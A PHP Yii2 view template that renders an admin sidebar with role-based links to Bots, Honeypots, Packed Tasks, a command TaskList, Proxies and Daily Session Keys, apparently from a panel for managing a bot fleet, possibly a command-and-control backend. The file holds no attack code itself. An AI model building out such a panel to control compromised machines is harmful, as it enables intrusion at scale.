<?php
use backend\models\Admin;
//if (Yii::$app->user->isGuest) {
//    return Yii::$app->response->redirect(['/admin']);
//}
        
?>
<?php if (!Yii::$app->user->isGuest) { ?>
<aside class="main-sidebar">

    <section class="sidebar">
        <?php if (Yii::$app->user->identity->role == Admin::ROLE_SUPER_ADMIN) { ?>
            <?= dmstr\widgets\Menu::widget(
                [
                    'options' => ['class' => 'sidebar-menu'],
                    'items' => [
                        ['label' => 'Administration tools', 'options' => ['class' => 'header']],
                        ['label' => 'Dashboard', 'icon' => 'dashboard', 'url' => ['site/index']],
                        ['label' => 'Administrators', 'icon' => 'users', 'url' => ['admin/index']],
                        ['label' => 'Users', 'icon' => 'users', 'url' => ['user/index']],
                        ['label' => 'Bots', 'icon' => 'exchange', 'url' => ['bots/index']],
                        ['label' => 'Honeypots', 'icon' => 'exchange', 'url' => ['honeypots/index']],
                        ['label' => 'Test Bots', 'icon' => 'exchange', 'url' => ['testbots/index']],
                        ['label' => 'Packed Tasks', 'icon' => 'list', 'url' => ['/tasks']],
                        ['label' => 'Networks', 'icon' => 'list', 'url' => ['/networks']],
                        ['label' => 'TaskList', 'icon' => 'tasks', 'url' => ['commands/index']],
                        ['label' => 'Groups', 'icon' => 'file', 'url' => ['groups/index']],
                        ['label' => 'Files', 'icon' => 'file', 'url' => ['files/index']],
                        ['label' => 'Proxies', 'icon' => 'file', 'url' => ['proxy/index']],
                        ['label' => 'Daily Session Keys', 'icon' => 'key', 'url' => ['sik/index']],
                    ],
                ]
            ) ?>
        
        <?php } elseif (Yii::$app->user->identity->role == Admin::ROLE_MANAGER) { ?>
            <?= dmstr\widgets\Menu::widget(
                [
                    'options' => ['class' => 'sidebar-menu'],
                    'items' => [
                        ['label' => 'Administration tools', 'options' => ['class' => 'header']],
                        ['label' => 'Dashboard', 'icon' => 'dashboard', 'url' => ['site/index']],
                        ['label' => 'Change Password', 'icon' => 'users', 'url' => ['admin/update', 'id' => Yii::$app->user->identity->id]],
                        ['label' => 'Bots', 'icon' => 'exchange', 'url' => ['bots/index']],
                        ['label' => 'Honeypots', 'icon' => 'exchange', 'url' => ['honeypots/index']],
                        ['label' => 'Test Bots', 'icon' => 'exchange', 'url' => ['testbots/index']],
                        ['label' => 'Packed Tasks', 'icon' => 'file', 'url' => ['tasks']],
                        ['label' => 'Groups', 'icon' => 'file', 'url' => ['groups/index']],
                    ],
                ]
            ) ?>
        <?php }else{ ?>
            <?= dmstr\widgets\Menu::widget(
                [
                    'options' => ['class' => 'sidebar-menu'],
                    'items' => [
                        ['label' => 'Administration tools', 'options' => ['class' => 'header']],
                        ['label' => 'Dashboard', 'icon' => 'dashboard', 'url' => ['site/index']],
                        ['label' => 'Change Password', 'icon' => 'users', 'url' => ['admin/update', 'id' => Yii::$app->user->identity->id]],
                        
                    ],
                ]
            ) ?>
        <?php } ?>    

    </section>

</aside>
<?php } ?>
